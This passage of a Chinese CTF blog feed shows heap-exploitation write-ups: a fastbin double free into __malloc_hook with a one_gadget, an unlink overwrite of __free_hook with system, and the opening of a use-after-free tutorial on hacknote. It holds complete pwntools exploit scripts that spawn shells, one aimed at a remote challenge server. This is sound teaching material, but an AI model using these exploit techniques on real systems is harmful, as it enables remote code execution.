class="line">add(<span class="number">0x30</span>, <span class="string">"b"</span>, <span class="string">"1"</span>) <span class="comment">#1</span></span><br><span class="line">delete(<span class="number">0</span>) </span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x30</span>, p64(ptr), <span class="string">'2'</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">'a'</span>, <span class="string">'3'</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">'a'</span>, <span class="string">'4'</span>) <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">'a'</span>*<span class="number">0x20</span> + <span class="string">'b'</span>*<span class="number">5</span> , <span class="string">'5'</span>)<span class="comment">#5</span></span><br><span class="line">show()</span><br><span class="line">io.recvuntil(<span class="string">"bbbbb"</span>)</span><br><span class="line">stdout_addr = u64(io.recvuntil(<span class="string">"Level"</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">stdout_addr = hex(stdout_addr)[:<span class="number">-2</span>]</span><br><span class="line">stdout_addr = int(stdout_addr, <span class="number">16</span>)</span><br><span class="line">io.success(<span class="string">"stdout_addr: 0x%x"</span> % stdout_addr)</span><br><span class="line"></span><br><span class="line">libc_base = stdout_addr - libc.symbols[<span class="string">'_IO_2_1_stdout_'</span>]</span><br><span class="line">realloc_addr = libc_base + libc.symbols[<span class="string">'__libc_realloc'</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0x45216</span> </span><br><span class="line">one_gadget = libc_base + <span class="number">0x4526a</span> </span><br><span class="line">one_gadget = libc_base + <span class="number">0xf02a4</span> </span><br><span class="line">one_gadget = libc_base + <span class="number">0xf1147</span></span><br><span class="line">malloc_hook = libc_base + libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">ptr = malloc_hook<span class="number">-0x20</span><span class="number">-0x3</span></span><br></pre></td></tr></table></figure><ol start="2"><li>利用double free改写地址</li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x60</span>, <span class="string">"a"</span>, <span class="string">"6"</span>)<span class="comment">#6</span></span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">"b"</span>, <span class="string">"7"</span>)<span class="comment">#7</span></span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">add(<span class="number">0x60</span>, p64(ptr), <span class="string">'8'</span>) <span class="comment">#8</span></span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">'a'</span>, <span class="string">'9'</span>) <span class="comment">#9</span></span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">'a'</span>, <span class="string">'10'</span>) <span class="comment">#10</span></span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">'c'</span>*<span class="number">0x10</span>+ <span class="string">'d'</span>*<span class="number">0x3</span> + p64(one_gadget), <span class="string">'6'</span>)</span><br><span class="line">io.success(<span class="string">"malloc_hook: 0x%x"</span> % malloc_hook)</span><br><span class="line">io.success(<span class="string">"libc_base: 0x%x"</span> % libc_base )</span><br><span class="line">io.success(<span class="string">"one_gadget: 0x%x"</span> % one_gadget)</span><br></pre></td></tr></table></figure><ol start="3"><li>getshell</li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>double free 拿到shell，这里其实malloc一次本地可以拿shell，远程不行，原因未详，可能栈环境对不上</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PwnContext.core <span class="keyword">import</span> *</span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = <span class="string">'./'</span> + <span class="string">'pwn1'</span></span><br><span class="line">elf = context.binary = ELF(exe)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="comment">#ctx.binary = './' + 'pwn1'</span></span><br><span class="line">ctx.binary = exe</span><br><span class="line">libc = args.LIBC <span class="keyword">or</span> <span class="string">'libc.so.6'</span></span><br><span class="line">ctx.debug_remote_libc = <span class="literal">True</span></span><br><span class="line">ctx.remote_libc = libc</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    io = ctx.start()</span><br><span class="line">    libc = ELF(libc)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(libc)</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Partial RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      No PIE (0x400000)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, name, level)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice : "</span>, <span class="string">"1"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Length of the name :"</span>, str(size))</span><br><span class="line">    io.sendlineafter(<span class="string">"The name of this life :"</span>, name)</span><br><span class="line">    io.sendlineafter(<span class="string">"The level of this life (High/Low) :"</span>, level)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice : "</span>, <span class="string">"2"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice : "</span>, <span class="string">"3"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Which life do you want to remove: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">destroy</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice : "</span>, <span class="string">"4"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice : "</span>, <span class="string">"5"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    ptr = <span class="number">0x00000000006020E0</span><span class="number">-0x20</span><span class="number">-0x30</span><span class="number">-0x6</span></span><br><span class="line">    add(<span class="number">0x30</span>, <span class="string">"a"</span>, <span class="string">"0"</span>) <span class="comment">#0</span></span><br><span class="line">    add(<span class="number">0x30</span>, <span class="string">"b"</span>, <span class="string">"1"</span>) <span class="comment">#1</span></span><br><span class="line">    delete(<span class="number">0</span>) </span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">0x30</span>, p64(ptr), <span class="string">'2'</span>) <span class="comment">#2</span></span><br><span class="line">    add(<span class="number">0x30</span>, <span class="string">'a'</span>, <span class="string">'3'</span>) <span class="comment">#3</span></span><br><span class="line">    add(<span class="number">0x30</span>, <span class="string">'a'</span>, <span class="string">'4'</span>) <span class="comment">#4</span></span><br><span class="line">    add(<span class="number">0x30</span>, <span class="string">'a'</span>*<span class="number">0x20</span> + <span class="string">'b'</span>*<span class="number">5</span> , <span class="string">'5'</span>)<span class="comment">#5</span></span><br><span class="line">    show()</span><br><span class="line">    io.recvuntil(<span class="string">"bbbbb"</span>)</span><br><span class="line">    stdout_addr = u64(io.recvuntil(<span class="string">"Level"</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">    stdout_addr = hex(stdout_addr)[:<span class="number">-2</span>]</span><br><span class="line">    stdout_addr = int(stdout_addr, <span class="number">16</span>)</span><br><span class="line">    io.success(<span class="string">"stdout_addr: 0x%x"</span> % stdout_addr)</span><br><span class="line">    </span><br><span class="line">    libc_base = stdout_addr - libc.symbols[<span class="string">'_IO_2_1_stdout_'</span>]</span><br><span class="line">    realloc_addr = libc_base + libc.symbols[<span class="string">'__libc_realloc'</span>]</span><br><span class="line">    one_gadget = libc_base + <span class="number">0x45216</span> </span><br><span class="line">    one_gadget = libc_base + <span class="number">0x4526a</span> </span><br><span class="line">    one_gadget = libc_base + <span class="number">0xf02a4</span> </span><br><span class="line">    one_gadget = libc_base + <span class="number">0xf1147</span></span><br><span class="line">    malloc_hook = libc_base + libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">    ptr = malloc_hook<span class="number">-0x20</span><span class="number">-0x3</span></span><br><span class="line">    add(<span class="number">0x60</span>, <span class="string">"a"</span>, <span class="string">"6"</span>)<span class="comment">#6</span></span><br><span class="line">    add(<span class="number">0x60</span>, <span class="string">"b"</span>, <span class="string">"7"</span>)<span class="comment">#7</span></span><br><span class="line">    delete(<span class="number">6</span>)</span><br><span class="line">    delete(<span class="number">7</span>)</span><br><span class="line">    delete(<span class="number">6</span>)</span><br><span class="line">    add(<span class="number">0x60</span>, p64(ptr), <span class="string">'8'</span>) <span class="comment">#8</span></span><br><span class="line">    add(<span class="number">0x60</span>, <span class="string">'a'</span>, <span class="string">'9'</span>) <span class="comment">#9</span></span><br><span class="line">    add(<span class="number">0x60</span>, <span class="string">'a'</span>, <span class="string">'10'</span>) <span class="comment">#10</span></span><br><span class="line">    add(<span class="number">0x60</span>, <span class="string">'c'</span>*<span class="number">0x10</span>+ <span class="string">'d'</span>*<span class="number">0x3</span> + p64(one_gadget), <span class="string">'6'</span>)</span><br><span class="line">    io.success(<span class="string">"malloc_hook: 0x%x"</span> % malloc_hook)</span><br><span class="line">    io.success(<span class="string">"libc_base: 0x%x"</span> % libc_base )</span><br><span class="line">    io.success(<span class="string">"one_gadget: 0x%x"</span> % one_gadget)</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    <span class="comment">#add(0x30, 'a'*0x20+'b'*5,'3')</span></span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure><h2 id="2019-网络内生安全试验场-pwn2"><a href="#2019-网络内生安全试验场-pwn2" class="headerlink" title="2019 网络内生安全试验场 pwn2"></a>2019 网络内生安全试验场 pwn2</h2><p>实战中遇到最简单的一道了？</p><h3 id="功能分析-2"><a href="#功能分析-2" class="headerlink" title="功能分析"></a>功能分析</h3><ol><li>new一个新堆块</li><li>删除一个堆块</li><li>展示一个堆块</li><li>修改堆块内容，有趣的是，他是固定大小0x100?</li><li>退出</li></ol><h3 id="漏洞点分析-2"><a href="#漏洞点分析-2" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">record</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"record which?"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( buf[v1] != <span class="number">0L</span>L &amp;&amp; v1 &gt;= <span class="number">0</span> &amp;&amp; v1 &lt;= <span class="number">9</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"content?"</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf[v1], <span class="number">0x100</span>uLL);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里是固定大小，所以申请小堆块可以溢出</p><h3 id="漏洞利用过程-2"><a href="#漏洞利用过程-2" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h3><ol><li><p>我的思路是溢出后unlink，然后在将两个堆块串联起来，unlink里介绍的手法，就是一个堆块指向另一个堆块存指针的地方，然后编辑一个堆块就是编辑地址，编辑另一个堆块就是编辑内容</p></li><li><p>初始化操作</p></li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"your choice :\n"</span>, <span class="string">"1"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"please input the size :\n"</span>, str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"your choice :\n"</span>, <span class="string">"2"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"delete which ?\n"</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"your choice :\n"</span>, <span class="string">"3"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"show which ?\n"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">record</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"your choice :\n"</span>, <span class="string">"4"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"record which?\n"</span>, str(idx))</span><br><span class="line">    io.sendlineafter(<span class="string">"content?\n"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"your choice :\n"</span>, <span class="string">"5"</span>)</span><br></pre></td></tr></table></figure><ol start="3"><li>unlink</li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ptr = <span class="number">0x6020c0</span></span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x40</span>) + p64(ptr<span class="number">-0x18</span>) + p64(ptr<span class="number">-0x10</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x40</span>)</span><br><span class="line">payload += p64(<span class="number">0x40</span>)</span><br><span class="line">payload += p64(<span class="number">0x90</span>)</span><br><span class="line">record(<span class="number">0</span>, payload)</span><br><span class="line">record(<span class="number">1</span>, <span class="string">"1"</span>*<span class="number">0x10</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#show(0)</span></span><br></pre></td></tr></table></figure><ol start="4"><li>链接两个堆块</li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x18</span> + p64(<span class="number">0x6020c8</span>+<span class="number">0x8</span>) + p64(<span class="number">0</span>) + p64(elf.got[<span class="string">'puts'</span>])</span><br><span class="line">record(<span class="number">0</span>, payload)</span><br><span class="line">show(<span class="number">2</span>)</span><br></pre></td></tr></table></figure><ol start="5"><li>泄露地址</li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">io.recvuntil(<span class="string">"the content is :"</span>)</span><br><span class="line">io.recvline()</span><br><span class="line">puts_addr = u64(io.recvline().strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">io.success(<span class="string">"puts_addr: 0x%x"</span> % puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">bin_sh_addr = libc_base + libc.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line">free_hook = libc_base + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br></pre></td></tr></table></figure><ol start="6"><li>getshell</li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">record(<span class="number">3</span>, <span class="string">"/bin/sh"</span>)</span><br><span class="line">record(<span class="number">0</span>, p64(free_hook))</span><br><span class="line">record(<span class="number">2</span>, p64(system_addr))</span><br><span class="line">delete(<span class="number">3</span>)</span><br></pre></td></tr></table></figure><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PwnContext.core <span class="keyword">import</span> *</span><br><span class="line">local = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = <span class="string">'./'</span> + <span class="string">'pwn2'</span></span><br><span class="line">elf = context.binary = ELF(exe)</span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line">host = <span class="string">'39.106.94.18'</span></span><br><span class="line">port = <span class="number">32768</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="comment">#ctx.binary = './' + 'pwn2'</span></span><br><span class="line">ctx.binary = exe</span><br><span class="line">libc = args.LIBC <span class="keyword">or</span> <span class="string">'libc.so.6'</span></span><br><span class="line">ctx.debug_remote_libc = <span class="literal">True</span></span><br><span class="line">ctx.remote_libc = libc</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    <span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">    io = ctx.start()</span><br><span class="line">    libc = ELF(libc)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line">    libc = ELF(libc)</span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Partial RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      No PIE (0x400000)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"your choice :\n"</span>, <span class="string">"1"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"please input the size :\n"</span>, str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"your choice :\n"</span>, <span class="string">"2"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"delete which ?\n"</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"your choice :\n"</span>, <span class="string">"3"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"show which ?\n"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">record</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"your choice :\n"</span>, <span class="string">"4"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"record which?\n"</span>, str(idx))</span><br><span class="line">    io.sendlineafter(<span class="string">"content?\n"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"your choice :\n"</span>, <span class="string">"5"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    </span><br><span class="line">    ptr = <span class="number">0x6020c0</span></span><br><span class="line">    add(<span class="number">0x40</span>)</span><br><span class="line">    add(<span class="number">0x80</span>)</span><br><span class="line">    add(<span class="number">0x40</span>)</span><br><span class="line">    add(<span class="number">0x40</span>)</span><br><span class="line">    payload = p64(<span class="number">0</span>) + p64(<span class="number">0x40</span>) + p64(ptr<span class="number">-0x18</span>) + p64(ptr<span class="number">-0x10</span>)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x40</span>)</span><br><span class="line">    payload += p64(<span class="number">0x40</span>)</span><br><span class="line">    payload += p64(<span class="number">0x90</span>)</span><br><span class="line">    record(<span class="number">0</span>, payload)</span><br><span class="line">    record(<span class="number">1</span>, <span class="string">"1"</span>*<span class="number">0x10</span>)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    <span class="comment">#show(0)</span></span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">0x18</span> + p64(<span class="number">0x6020c8</span>+<span class="number">0x8</span>) + p64(<span class="number">0</span>) + p64(elf.got[<span class="string">'puts'</span>])</span><br><span class="line">    record(<span class="number">0</span>, payload)</span><br><span class="line">    show(<span class="number">2</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"the content is :"</span>)</span><br><span class="line">    io.recvline()</span><br><span class="line">    puts_addr = u64(io.recvline().strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">    io.success(<span class="string">"puts_addr: 0x%x"</span> % puts_addr)</span><br><span class="line">    libc_base = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    bin_sh_addr = libc_base + libc.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line">    free_hook = libc_base + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">    </span><br><span class="line">    record(<span class="number">3</span>, <span class="string">"/bin/sh"</span>)</span><br><span class="line">    record(<span class="number">0</span>, p64(free_hook))</span><br><span class="line">    record(<span class="number">2</span>, p64(system_addr))</span><br><span class="line">    delete(<span class="number">3</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#delete(0)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure><h2 id="题目下载地址"><a href="#题目下载地址" class="headerlink" title="题目下载地址"></a>题目下载地址</h2><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL05vT25lLWh1Yi9jdGYtc2F2ZQ==" title="https://github.com/NoOne-hub/ctf-save">点我，快点我<i class="fa fa-external-link"></i></span></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>实操的时候发觉自己点是知道了，找漏洞点能力还待提升，利用起来也是得多调试下</p><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/84788ee9/">https://noone-hub.github.io/posts/84788ee9/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>bin</category>
        <category>pwn</category>
        <category>堆</category>
      </categories>
      <tags>
        <tag>pwn， 堆</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn堆入门系列教程5</title>
    <url>/posts/1d71df53/</url>
    <content><![CDATA[<h1 id="pwn堆入门系列教程5"><a href="#pwn堆入门系列教程5" class="headerlink" title="pwn堆入门系列教程5"></a>pwn堆入门系列教程5</h1><p>本文首发于先知社区</p><p><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjA4Nw==" title="https://xz.aliyun.com/t/6087">pwn堆入门系列教程1<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjE2OQ==" title="https://xz.aliyun.com/t/6169">pwn堆入门系列教程2<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjI1Mg==" title="https://xz.aliyun.com/t/6252">pwn堆入门系列教程3<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjMyMg==" title="https://xz.aliyun.com/t/6322">pwn堆入门系列教程4<i class="fa fa-external-link"></i></span></p><p>进入uaf学习了，这部分题目就一道题</p><h2 id="hitcon-training-hacknote"><a href="#hitcon-training-hacknote" class="headerlink" title="hitcon-training-hacknote"></a>hitcon-training-hacknote</h2><p>这道题其实很简单，不过要冷静下才能做，我当时有点急躁，浪费一个钟才搞出来？冷静下来10分钟懂了</p><a id="more"></a><!-- build time:Wed Nov 20 2019 23:00:27 GMT+0800 (China Standard Time) --><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">del_note</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Index :"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">  v1 = atoi(&amp;buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= count )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Out of bound!"</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( notelist[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(*(notelist[v1] + <span class="number">1</span>));</span><br><span class="line">    <span class="built_in">free</span>(notelist[v1]);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Success"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="漏洞利用过程"><a href="#漏洞利用过程" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h3><p>具体分析不讲了，ctf-wiki上讲的很清楚， 我大致讲一下就是要利用要覆盖到他的content指针，这样的话print的时候会调用到另一个函数</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PwnContext.core <span class="keyword">import</span> *</span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = <span class="string">'./'</span> + <span class="string">'hacknote'</span></span><br><span class="line">elf = context.binary = ELF(exe)</span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span></span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="comment">#ctx.binary = './' + 'hacknote'</span></span><br><span class="line">ctx.binary = exe</span><br><span class="line">libc = elf.libc</span><br><span class="line">ctx.debug_remote_libc = <span class="literal">False</span></span><br><span class="line">ctx.remote_libc = libc</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    io = ctx.start()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     i386-32-little</span></span><br><span class="line"><span 